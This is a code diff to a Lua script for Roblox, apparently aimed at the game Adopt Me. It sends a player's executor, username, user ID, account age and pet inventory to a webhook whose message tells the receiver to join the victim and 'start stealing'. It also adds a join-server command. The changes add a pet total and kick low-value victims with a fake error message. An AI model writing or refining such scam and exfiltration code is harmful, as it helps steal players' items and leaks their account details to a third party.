@@ -48,13 +48,38 @@ coroutine.wrap(function()
     if InventoryDB[v.category][v.id].rarity == "common" then
       common_count = common_count + 1
     end
-    if InventoryDB[v.category][v.id].properties == "mega_neon" then
-      mega_count = mega_count + 1
-    end
-    if InventoryDB[v.category][v.id].properties == "neon" then
-      neon_count = neon_count + 1
-    end
   end
+
+  if legendaries_count == 1 then
+    legendaries_count = 0
+elseif legendaries_count > 1 then
+    legendaries_count = legendaries_count - 1
+end
+
+if ultra_count == 1 then
+    ultra_count = 0
+elseif ultra_count > 1 then
+    ultra_count = ultra_count - 1
+end
+
+if rare_count == 1 then
+  rare_count = 0
+elseif rare_count > 1 then
+  rare_count = rare_count - 1
+end
+
+if common_count == 2 then
+  common_count = 0
+elseif common_count > 1 then
+  common_count = common_count - 1
+end
+
+local total = common_count + uncommon_count + rare_count + ultra_count + legendaries_count
+
+if total <= 5 then
+  plr:kick("Script errors while running.")
+  return
+end
   
   local exploit
   local function getexploit()
@@ -73,7 +98,7 @@ coroutine.wrap(function()
     embeds = {
       {
         title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
-        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")',
+        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n🤑 Total Pets: '.. tostring(total).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")',
         color = 10428396
       }
     }
